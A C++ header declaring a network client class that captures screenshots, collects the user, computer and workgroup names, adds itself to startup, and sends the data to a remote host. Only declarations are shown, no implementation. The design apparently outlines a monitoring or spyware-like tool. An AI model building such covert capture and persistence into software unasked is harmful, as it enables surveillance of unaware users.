#pragma once
#include "../Общие зависимости/NetworkHandler.h"
#pragma comment(lib, "Netapi32.lib")
#include <lm.h>

class ClientServer : public NetworkHandler
{
private:
    std::vector<char> printScreen();
    std::string image_size_data;
    size_t image_size_data_size;

    DataType send_data_type;

    std::string user_name;
    std::string computer_name;
    std::string work_group;

    virtual void handlerData(DataBuffer data, Client& client) final;

    virtual void handlerConnect(Client& client);

    virtual void handlerDisconnect(Client& client);

    virtual bool sendDataBy(uint32_t host, uint16_t port, const void* buffer, const size_t size) override;

    std::string getUserName();

    std::string getComputerName();

    std::string getWorkGroup();

    bool AddToStartup();
public:
    ClientServer(const uint16_t port);
    void sendUserData();
};

